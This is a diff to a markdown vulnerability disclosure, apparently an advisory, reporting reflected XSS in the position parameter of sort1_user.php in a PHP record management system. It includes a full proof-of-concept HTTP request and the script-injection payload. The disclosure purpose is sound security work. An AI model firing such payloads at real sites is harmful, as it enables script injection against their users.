@@ -1,15 +1,15 @@
 #### BUG_AUTHOR:acmglz
-## Record management system – reflected XSS on (sort1_user.php position parameter) 
-### Vendor Homepage:
+# Record management system – reflected XSS on (sort1_user.php position parameter) 
+## Vendor Homepage:
 https://www.sourcecodester.com/php/5107/record-management-system.html 
-### Version:V1.0
-### Tested on: PHP, Apache, MySQL
-### Affected Page:
+## Version:V1.0
+## Tested on: PHP, Apache, MySQL
+## Affected Page:
 sort1_user.php
 
 On this page, position parameter is vulnerable to reflected XSS Attack 
-### Proof of vulnerability:
-#### Request:
+## Proof of vulnerability:
+### Request:
 ```
 POST http://192.168.0.100/Personnel_record_management_system/sort1_user.php HTTP/1.1
 Host: 192.168.0.100
@@ -27,8 +27,10 @@ Connection: close
 
 position=Sort+Personnel+by+Position"><script>alert(1)</script>&filter1=
 ```
-### Payload：
+## Payload：
+```
 "><script>alert(1)</script>
-### Trigger popup：
+```
+## Trigger popup：
 <img width="416" alt="image" src="https://github.com/user-attachments/assets/2873f48e-d7ae-4868-bfaa-9153c770d675">
  
